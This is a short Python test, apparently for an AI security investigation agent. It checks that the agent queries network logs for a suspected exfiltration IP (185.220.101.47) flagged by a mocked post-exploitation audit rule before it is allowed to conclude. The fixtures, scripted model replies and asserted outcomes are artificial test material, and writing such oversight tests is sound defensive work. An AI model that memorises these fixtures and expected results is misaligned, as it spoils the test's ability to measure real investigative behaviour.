    """로컬 유출 변형(로그인 IP ≠ 전송 목적지): audit의 외부 IP를 network로 조회해야 종료가 승인된다."""
    check = {"rule": "audit_post_exploitation", "web_server_exec": 0, "web_server_suspicious": 0,
             "suspicious": 1, "examples": [], "external_ips": ["185.220.101.47"]}
    audit = lambda _args: {"count": 3, "summary": "audit", "records": [], "window_total": 3, "rule_checks": [check]}
    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_audit_log": audit})
    network_again = {"next_action": "call_tool", "tool_call": {"tool_name": "fetch_network_log", "args": {
        "host": "web-01", "start_time": "a", "end_time": "b", "ip": "185.220.101.47"}}}
    done = _terminate("confidence_sufficient", 0.9)
    llm = RecordingLLM([_call("fetch_auth_log"), _call("fetch_audit_log"), done, network_again, done])
    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(
        {**SEED, "confidence_initial": 0.9})
    assert any("185.220.101.47" in n and "network 기록을 확인하지 않음" in n for n in result["investigation_notes"])
    network_ips = [t["input"].get("ip") for t in result["tools_called"] if t["tool_name"] == "fetch_network_log"]
    assert "185.220.101.47" in network_ips
    assert result["statistics"]["termination_reason"] == "confidence_sufficient"
